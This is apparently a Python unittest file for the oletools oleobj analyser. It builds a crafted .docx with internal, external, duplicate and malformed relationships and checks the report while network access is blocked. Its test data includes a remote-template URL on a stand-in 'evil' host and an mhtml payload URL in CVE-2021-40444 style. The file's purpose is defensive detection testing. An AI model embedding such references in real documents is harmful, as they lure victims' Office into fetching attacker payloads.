""" Test the relationship report of oleobj.

Builds a small OOXML (zip) document containing root relationships, sub-part
relationships, duplicate targets, relative paths and incomplete relationship
XML, and checks that the report carries source part, relationship type and
raw target for every relationship, marking mere internal references as such.

All tests run with network access blocked to prove that the evidence is
produced from the document alone.
"""

import unittest
import io
import os
import shutil
import socket
import tempfile
import zipfile
from contextlib import redirect_stdout
from unittest import mock

from oletools import oleobj
from oletools.ooxml import XmlParser

# Directory with test data, independent of current working directory
from tests.test_utils import call_and_capture


#: external URL referenced from two different relationship parts
DUP_URL = 'https://evil.example.com/template.dotx'
#: external URL exploiting mhtml (CVE-2021-40444 style)
MHTML_URL = 'mhtml:https://evil.example.com/payload.hta!x-usc:payload'
#: external URL on a relationship that lacks a Type attribute
ORPHAN_URL = 'https://orphan.example.com/no-type'

RELS_NS = 'http://schemas.openxmlformats.org/package/2006/relationships'
OFFICE_REL_NS = 'http://schemas.openxmlformats.org/officeDocument/2006/' \
                'relationships'

#: subfiles of the small test document
SAMPLE_SUBFILES = {
    '[Content_Types].xml':
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/'
        'content-types">'
        '<Default Extension="rels" ContentType="application/vnd.openxmlformats'
        '-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" ContentType="application/vnd.'
        'openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
        '</Types>',
    # root relationships: internal relative target + external template
    '_rels/.rels':
        '<Relationships xmlns="{0}">'
        '<Relationship Id="rId1" Type="{1}/officeDocument" '
        'Target="word/document.xml"/>'
        '<Relationship Id="rId2" Type="{1}/attachedTemplate" '
        'Target="{2}" TargetMode="External"/>'
        '</Relationships>'.format(RELS_NS, OFFICE_REL_NS, DUP_URL),
    # sub-part relationships: duplicate target, relative paths, incomplete XML
    'word/_rels/document.xml.rels':
        '<Relationships xmlns="{0}">'
        '<Relationship Id="rId1" Type="{1}/hyperlink" '
        'Target="{2}" TargetMode="External"/>'
        '<Relationship Id="rId2" Type="{1}/image" Target="media/image1.png"/>'
        '<Relationship Id="rId3" Type="{1}/oleObject" '
        'Target="{3}" TargetMode="External"/>'
        '<Relationship Id="rId4" Type="{1}/hyperlink" TargetMode="External"/>'
        '<Relationship Id="rId5" Target="{4}" TargetMode="External"/>'
        '<Relationship Id="rId6" Type="{1}/styles" Target="styles.xml"/>'
        '</Relationships>'.format(RELS_NS, OFFICE_REL_NS, DUP_URL, MHTML_URL,
                                  ORPHAN_URL),
    # incomplete relationship XML: truncated, not well-formed
    'word/_rels/settings.xml.rels':
        '<Relationships xmlns="{0}"><Relationship Id="rId1" '
        'Type="{1}/settings" Target="settings.xml"'.format(RELS_NS,
                                                           OFFICE_REL_NS),
    'word/document.xml':
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/'
        'wordprocessingml/2006/main"><w:body/></w:document>',
}


def _no_network(*args, **kwargs):
    """ replacement for network functions: fail the test if called """
    raise AssertionError('network access attempted during analysis; the '
                         'report must be built from the document alone')


def _block_network():
    """ create patchers that make any network access fail loudly """
    return [
        mock.patch.object(socket, 'socket', side_effect=_no_network),
        mock.patch.object(socket, 'create_connection',
                          side_effect=_no_network),
        mock.patch.object(socket, 'getaddrinfo', side_effect=_no_network),
    ]


class TestRelationshipsReport(unittest.TestCase):
    """ check the relationship report against a small crafted document """

    @classmethod
    def setUpClass(cls):
        """ write the small test document into a temp dir """
        cls.temp_dir = tempfile.mkdtemp(prefix='oleobj-rels-test-')
        cls.sample_path = os.path.join(cls.temp_dir, 'sample.docx')
        with zipfile.ZipFile(cls.sample_path, 'w') as zipper:
            for name, content in SAMPLE_SUBFILES.items():
                zipper.writestr(name, content)

    @classmethod
    def tearDownClass(cls):
        shutil.rmtree(cls.temp_dir, ignore_errors=True)

    def setUp(self):
        """ block all network access for the duration of each test """
        self._patchers = _block_network()
        for patcher in self._patchers:
            patcher.start()

    def tearDown(self):
        for patcher in self._patchers:
            patcher.stop()

    def _collect_records(self):
        """ run find_relationships on the sample document """
        return list(oleobj.find_relationships(XmlParser(self.sample_path)))

    def test_report_contains_source_type_and_target(self):
        """ every record carries source part, relationship type and target """
        records = self._collect_records()
        # 2 root + 6 sub-part relationships; the malformed .rels yields none
        self.assertEqual(len(records), 8)
        for record in records:
            self.assertIn(record.source_part,
                          ('_rels/.rels', 'word/_rels/document.xml.rels'))
        by_id = {(rec.source_part, rec.rel_id): rec for rec in records}
        # root relationship with relative target is an internal reference
        root_doc = by_id[('_rels/.rels', 'rId1')]
        self.assertEqual(root_doc.rel_type, 'officeDocument')
        self.assertEqual(root_doc.target, 'word/document.xml')
        self.assertFalse(root_doc.is_external)
        # sub-part relationship with relative target is internal as well
        image = by_id[('word/_rels/document.xml.rels', 'rId2')]
        self.assertEqual(image.rel_type, 'image')
        self.assertEqual(image.target, 'media/image1.png')
        self.assertFalse(image.is_external)
        # missing TargetMode defaults to internal (ECMA-376)
        styles = by_id[('word/_rels/document.xml.rels', 'rId6')]
        self.assertEqual(styles.target_mode, 'Internal')
        self.assertFalse(styles.is_external)
        # raw external targets are reported verbatim
        template = by_id[('_rels/.rels', 'rId2')]
        self.assertEqual(template.rel_type, 'attachedTemplate')
        self.assertEqual(template.target, DUP_URL)
        self.assertTrue(template.is_external)
        ole_object = by_id[('word/_rels/document.xml.rels', 'rId3')]
        self.assertEqual(ole_object.target, MHTML_URL)
        self.assertTrue(ole_object.is_external)

    def test_duplicate_target_distinguished_by_source_part(self):
        """ same URL reported once per trigger location """
        records = self._collect_records()
        duplicates = [rec for rec in records if rec.target == DUP_URL]
        self.assertEqual(len(duplicates), 2)
        self.assertEqual(set(rec.source_part for rec in duplicates),
                         {'_rels/.rels', 'word/_rels/document.xml.rels'})
        self.assertEqual(set(rec.rel_type for rec in duplicates),
                         {'attachedTemplate', 'hyperlink'})

    def test_incomplete_relationships_do_not_crash(self):
        """ missing attributes and malformed XML are tolerated """
        records = self._collect_records()
        by_id = {(rec.source_part, rec.rel_id): rec for rec in records}
        # relationship without Target: still reported, target is None
        no_target = by_id[('word/_rels/document.xml.rels', 'rId4')]
        self.assertIsNone(no_target.target)
        self.assertTrue(no_target.is_external)
        # relationship without Type: still reported, rel_type is None
        no_type = by_id[('word/_rels/document.xml.rels', 'rId5')]
        self.assertIsNone(no_type.rel_type)
        self.assertEqual(no_type.target, ORPHAN_URL)

    def test_find_external_relationships_still_compatible(self):
        """ old 2-tuple API keeps working (used e.g. by oleid) """
        results = list(oleobj.find_external_relationships(
            XmlParser(self.sample_path)))
        for entry in results:
            self.assertEqual(len(entry), 2)
        self.assertIn(('attachedTemplate', DUP_URL), results)
        self.assertIn(('hyperlink', DUP_URL), results)
        self.assertIn(('oleObject', MHTML_URL), results)
        # incomplete relationships are not reported as external links
        targets = [target for _, target in results]
        self.assertNotIn(ORPHAN_URL, targets)
        self.assertNotIn(None, targets)

    def test_process_file_prints_full_report(self):
        """ oleobj report marks external links and internal references """
        stream = io.StringIO()
        with redirect_stdout(stream):
            err_stream, err_dumping, did_dump = oleobj.process_file(
                self.sample_path, None)
        output = stream.getvalue()
        self.assertFalse(err_stream)
        self.assertFalse(err_dumping)
        self.assertTrue(did_dump)
        # external links with source part, type and raw target
        self.assertIn("Found relationship in _rels/.rels: type "
                      "'attachedTemplate', target '{0}' [external link]"
                      .format(DUP_URL), output)
        self.assertIn("Found relationship in word/_rels/document.xml.rels: "
                      "type 'hyperlink', target '{0}' [external link]"
                      .format(DUP_URL), output)
        # internal references are marked as such
        self.assertIn("type 'officeDocument', target 'word/document.xml' "
                      "[internal reference]", output)
        self.assertIn("type 'image', target 'media/image1.png' "
                      "[internal reference]", output)
        # incomplete relationships are visible but not external links
        self.assertIn('no target (incomplete relationship)', output)
        self.assertIn('unknown (incomplete relationship)', output)
        # mhtml exploit hint is still printed
        self.assertIn('Potential exploit for CVE-2021-40444', output)

    def test_oleobj_cli_reports_relationships(self):
        """ the oleobj command line tool prints the full report """
        output, ret_val = call_and_capture('oleobj', [self.sample_path, ],
                                           accept_nonzero_exit=True)
        self.assertEqual(ret_val, oleobj.RETURN_DID_DUMP,
                         msg='Wrong return value. Output:\n' + output)
        self.assertIn("Found relationship in _rels/.rels", output)
        self.assertIn("Found relationship in word/_rels/document.xml.rels",
                      output)
        self.assertIn('[internal reference]', output)
        self.assertIn('[external link]', output)


# just in case somebody calls this file as a script
if __name__ == '__main__':
    unittest.main()
